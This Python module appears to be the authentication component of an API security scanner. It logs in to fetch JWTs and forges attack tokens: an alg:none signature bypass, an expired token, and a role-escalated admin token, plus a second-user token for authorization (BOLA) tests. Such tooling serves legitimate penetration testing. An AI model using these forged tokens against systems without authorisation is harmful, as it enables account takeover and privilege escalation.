import httpx
import jwt as pyjwt


def login(login_url: str, username: str, password: str) -> str:
    """
    POST credentials to login_url, extract JWT from response.
    Tries JSON body first, then form-encoded. Checks common token field names
    and nested structures like {"data": {"token": "..."}}.
    """
    tried = []
    for payload, kwargs in [
        ({"username": username, "password": password}, {"json": {"username": username, "password": password}}),
        ({"email": username, "password": password},    {"json": {"email": username, "password": password}}),
        (None,                                          {"data": {"username": username, "password": password}}),
    ]:
        try:
            r = httpx.post(login_url, timeout=10, **kwargs)
            tried.append(f"  {r.status_code} {list(kwargs.keys())[0]}: {r.text[:120]}")
            if r.status_code not in (200, 201):
                continue
            data = r.json()
            # Flat response
            for key in ("token", "access_token", "accessToken", "jwt", "id_token", "auth_token"):
                if key in data:
                    token = data[key]
                    return token if token.startswith("Bearer ") else f"Bearer {token}"
            # Nested: {"data": {"token": "..."}}
            if isinstance(data.get("data"), dict):
                for key in ("token", "access_token", "accessToken", "jwt"):
                    if key in data["data"]:
                        token = data["data"][key]
                        return token if token.startswith("Bearer ") else f"Bearer {token}"
        except Exception as e:
            tried.append(f"  error: {e}")

    raise SystemExit(
        f"[!] Login failed — could not extract token from {login_url}\n"
        f"Responses tried:\n" + "\n".join(tried)
    )


class AuthHandler:
    def __init__(self, token1: str, token2: str = None):
        self.token1 = token1  # primary user token
        self.token2 = token2  # second user token (for BOLA)

    def headers(self, token: str) -> dict:
        return {"Authorization": token, "Content-Type": "application/json"}

    def tampered_jwt(self, token: str) -> str:
        """Return a JWT with alg set to none (classic bypass)."""
        try:
            raw = token.replace("Bearer ", "")
            decoded = pyjwt.decode(raw, options={"verify_signature": False})
            tampered = pyjwt.encode(decoded, "", algorithm="none")
            return f"Bearer {tampered}"
        except Exception:
            return token

    def expired_jwt(self, token: str) -> str:
        """Return a JWT with exp set to past."""
        try:
            raw = token.replace("Bearer ", "")
            decoded = pyjwt.decode(raw, options={"verify_signature": False})
            decoded["exp"] = 1
            tampered = pyjwt.encode(decoded, "", algorithm="none")
            return f"Bearer {tampered}"
        except Exception:
            return token

    def admin_jwt(self, token: str) -> str:
        """Return a JWT with role escalated to admin."""
        try:
            raw = token.replace("Bearer ", "")
            decoded = pyjwt.decode(raw, options={"verify_signature": False})
            for key in ("role", "roles", "group", "type"):
                if key in decoded:
                    decoded[key] = "admin"
            decoded["isAdmin"] = True
            tampered = pyjwt.encode(decoded, "", algorithm="none")
            return f"Bearer {tampered}"
        except Exception:
            return token
